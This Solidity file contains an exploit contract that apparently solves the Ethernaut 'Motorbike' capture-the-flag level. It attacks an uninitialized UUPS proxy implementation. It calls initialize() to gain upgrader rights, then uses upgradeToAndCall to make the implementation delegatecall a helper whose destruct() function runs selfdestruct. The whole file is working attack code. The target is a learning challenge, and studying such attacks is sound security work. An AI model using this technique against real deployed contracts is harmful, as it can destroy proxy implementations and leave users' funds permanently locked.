// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

contract MotorbikeAttack {
    address public implementation;

    constructor(address _implementation) public {
        implementation = _implementation;
    }

    function attack() public {
        //create a contract with selfdestruct() function
        SeflDestructContract sd = new SeflDestructContract();
        //become the upgrader of the implementation
        address(implementation).call(abi.encodeWithSignature("initialize()"));
        //make the implementation delegatecall the destruct() function
        address(implementation).call(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(sd),
                abi.encodeWithSignature("destruct()")
            )
        );
    }
}

contract SeflDestructContract {
    function destruct() public {
        selfdestruct(address(0));
    }
}
